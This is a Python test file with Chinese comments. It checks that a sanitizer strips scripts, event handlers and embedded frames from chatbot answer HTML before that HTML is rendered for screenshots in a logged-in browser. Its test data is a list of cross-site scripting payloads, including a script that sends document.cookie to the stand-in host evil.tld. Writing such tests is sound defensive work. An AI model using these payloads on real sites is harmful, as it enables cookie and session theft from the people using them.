"""截图证据页的 HTML 消毒。

这段 HTML 来自 chat.deepseek.com 的回答气泡，会被 set_content 渲染到
同一个 browser context（带登录态）的新页面上截图。
正则消毒只是第二层，真正兜底的是文档头里的 CSP —— 但第二层也不该形同虚设。
"""
from __future__ import annotations

import pytest

from app.providers.deepseek_web import _sanitize_answer_html

DANGEROUS = [
    # 旧实现只处理带引号的写法，这条能整条活下来
    '<img src=x onerror=alert(1)>',
    '<img src="x" onerror="alert(1)">',
    "<img src='x' onerror='alert(1)'>",
    '<div onclick={handler}>点我</div>',
    '<script>fetch("//evil.tld?c="+document.cookie)</script>',
    '<SCRIPT>alert(1)</SCRIPT>',
    '<iframe src="//evil.tld"></iframe>',
    '<a href="javascript:alert(1)">链接</a>',
    '<object data="//evil.tld"></object>',
    '<embed src="//evil.tld">',
    '<link rel="stylesheet" href="//evil.tld/x.css">',
    '<svg onload=alert(1)></svg>',
    '<body onload = alert(1)>',
]


@pytest.mark.parametrize("html", DANGEROUS)
def test_no_script_or_handler_survives(html):
    out = _sanitize_answer_html(html)
    low = out.lower()
    assert "<script" not in low
    assert "<iframe" not in low
    assert "<object" not in low
    assert "<embed" not in low
    assert "javascript:" not in low
    # 不留任何 on* 事件处理器
    assert not any(
        f"on{evt}" in low.replace(" ", "")
        for evt in ("error=", "click=", "load=", "mouseover=")
    )


@pytest.mark.parametrize(
    "html",
    [
        "<p>土巴兔是装修平台。</p>",
        "<table><tr><th>品牌</th><td>土巴兔</td></tr></table>",
        "<ul><li>第一项</li><li>第二项</li></ul>",
        '<a href="https://example.com/a">正常外链</a>',
        "<strong>加粗</strong>与<code>行内代码</code>",
    ],
)
def test_normal_answer_markup_is_kept(html):
    """证据截图要能看出表格/列表结构，消毒不能把正文格式也铲了。"""
    assert _sanitize_answer_html(html) == html
